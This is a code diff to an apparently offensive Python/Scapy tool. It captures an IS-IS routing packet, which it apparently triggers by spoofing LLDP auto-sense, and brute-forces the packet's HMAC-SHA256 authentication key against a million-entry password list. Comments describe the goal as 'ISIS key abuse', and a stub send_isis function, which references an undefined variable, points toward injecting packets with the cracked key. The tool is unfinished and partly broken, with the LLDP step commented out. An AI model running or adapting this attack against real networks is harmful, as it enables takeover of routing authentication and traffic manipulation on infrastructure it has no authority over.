@@ -53,12 +53,14 @@ def derive_ip(input: bytes) -> bytes:
     new_ip = bytes(parts)
     return new_ip
 
+# Derive systemid field
 def derive_autosense(input: bytes) -> bytes:
     return input[:3] + os.urandom(6) + input[-8:]
 
-# "Ko is always L octets long" so here Ko is alway HASH_LEN octets long. 
-# Take K (the key as a string), returns Ko as hex to the correct size
+# Compute Ko from K
 def k_to_ko(k: string) -> bytes:
+    # "Ko is always L octets long" so here Ko is alway HASH_LEN octets long. 
+    # Take K (the key as a string), returns Ko as hex to the correct size
     kb = k.encode()
     if len(kb) > HASH_LEN :
         ko = hashlib.sha256(kb).digest()
@@ -67,6 +69,7 @@ def k_to_ko(k: string) -> bytes:
     assert len(ko) == HASH_LEN
     return ko
 
+# Derive received LLDP packet and send it back
 def send_lldp(packet: Packet):
     src_mac = packet[0].getlayer(LLDPDUChassisID).id
     src_ip = packet[0].getlayer(LLDPDUManagementAddress).management_address
@@ -122,9 +125,13 @@ def send_lldp(packet: Packet):
 
     #pkt_to_send.show()
     # TODO : Check packet conformity before sending ?
-    wrpcap(filename="Wireshark_captures/output.pcapng",pkt=pkt_to_send)
+    wrpcap(filename="Wireshark_captures/output_lldp.pcapng",pkt=pkt_to_send)
     #sendp(pkt_to_send, iface=IFACE, count=10, inter=1)
 
+# Derive received ISIS packet and send it back
+def send_isis(packet: Packet):
+    wrpcap(filename="Wireshark_captures/output_isis.pcapng",pkt=isis_to_send)
+    return
 
 # First-Hash = H(Ko XOR Ipad || (IS-IS PDU))
 def get_inner_hash(ko: bytes, isis_apad: bytes) -> bytes:
@@ -140,64 +147,71 @@ def get_outer_hash(ko: bytes, inner_hash: bytes) -> bytes:
     assert len(k_opad) == BLOCK_SIZE
     return hashlib.sha256(k_opad + inner_hash).digest()
 
+# Compute Ko, First-Hash and Second-Hash
+def get_hash(key: bytes, isis_apad: bytes) -> bytes:
+    ko = k_to_ko(key)
+    inner_hash = get_inner_hash(ko, isis_apad)
+    outer_hash = get_outer_hash(ko, inner_hash)
+    return outer_hash
 
-def build_isis(packet: Packet):
+# Extract received hash and compare with computed hashes from dictionnary list
+def find_key(packet: Packet):
     t_password = packet[0].getlayer(ISIS_AuthenticationTlv).password
-    t_key = t_password[2:] # Remove 2 first bytes matchin the keyID
-    f_key = ""
-    # if auth is not None:
-    #     print(auth.type)
-    #     print(auth.len)
-    #     print(auth.authtype)
-    #     print(auth.password)
+    t_hash = t_password[2:] # Remove 2 first bytes matchin the keyID in sha-2
+    print(t_hash.hex())
+    f_key = None
+
     # Step 1 : Get ISIS PDU
     isis_pdu = packet.getlayer(ISIS_CommonHdr)
-    #print(key.hex())
     isis_bytes = isis_pdu.original
-    #print(isis_bytes.hex())
-    # Step 2 : Remove ISIS authentifcation data. Assume sha2 only for now. Assume no padding for now.
+    print(isis_bytes[0])
+    # Step 2 : Remove ISIS authentifcation data. 
+    # TODO: Assume sha2 only for now. 
+    # TODO: Assume no padding for now.
     #isis_pdu_trunc, pad = packet.extract_padding(isis_pdu)
-    #isis_pdu_trunc.show()
     isis_bytes_trunc = isis_bytes[:-32]
-    #print(isis_bytes_trunc.hex())
+
+    # Step 3 : Concatenate APAD value to previously truncated PDU
     isis_apad = isis_bytes_trunc + APAD
-    #print(isis_apad.hex())
-    # Step 3 : calculate inner hash
-    print("Expected result: ", t_key.hex())
+
+    # Step 4 : For each dict entry, evaluate hash against captured hash
     with open('dicts/1000000-password-seclists.txt') as my_dict:
         for key in my_dict:
-            #print(key)
-            ko = k_to_ko(key.rstrip("\n"))
-            inner_hash = get_inner_hash(ko, isis_apad)
-            outer_hash = get_outer_hash(ko, inner_hash)
-            #print(outer_hash.hex())
-            if t_key.hex() == outer_hash.hex():
+            d_hash = get_hash(key.rstrip("\n"), isis_apad)
+            if t_hash.hex() == d_hash.hex():
                 f_key = key;
                 break;
     if f_key:
         print("Key found: ", f_key)
+        return f_key
     else:
         print("Key not found, try another dictionnary.")
+        return 1
 
+# Do you really need to describe main ?
 def main():
     # Start ISIS sniffer first in async mode, then start LLDP, so ISIS sniffer is already listening when LLDP triggers auto-sense.
     # Filter on ISIS Header and exclude your own MAC as source so you don't stop when you sniff your own packet.
-    isis_sniffer = AsyncSniffer(offline="Wireshark_captures/sha-256-toto.pcapng", lfilter=lambda p: p.haslayer(ISIS_CommonHdr) and p.src != MY_MAC, count=1)
-    #print(type(isis_sniffer))
+    isis_sniffer = AsyncSniffer(offline="Wireshark_captures/ISIS-21yHFT1Uy0qiM.pcapng", \
+        lfilter=lambda p: p.haslayer(ISIS_CommonHdr) and p.src != MY_MAC, \
+        count=1)
     isis_sniffer.start()
 
     # Start LLDP sniffer, filter on LLDP, stop asa you receive one
-    lldp_sniffer = AsyncSniffer(offline="Wireshark_captures/sha-256-one-side-from-startup.pcapng", filter="ether proto 0x88cc", count=1)
-    lldp_sniffer.start()
-    lldp_sniffer.join(timeout=10) # If none is received during 10s, assume error
-    send_lldp(lldp_sniffer.results[0])
+    #lldp_sniffer = AsyncSniffer(offline="Wireshark_captures/sha-256-one-side-from-startup.pcapng", \
+    #    filter="ether proto 0x88cc", \
+    #    count=1)
+    #lldp_sniffer.start()
+    #lldp_sniffer.join(timeout=10) # If none is received during 10s, assume error
+    #send_lldp(lldp_sniffer.results[0])
     
     # Assume here for now that the LLDP packet is sent, and the target switch has answered. Proceed with ISIS key abuse.
     isis_sniffer.join(timeout=10) # If none is received during 10s, assume error
     isis_pkt = isis_sniffer.results[0]
     #isis_pkt.show()
-    build_isis(isis_pkt)
 
+    f_key = find_key(isis_pkt)
+    #send_isis(isis_pkt, f_key)
 
 if __name__ == "__main__":
     main()
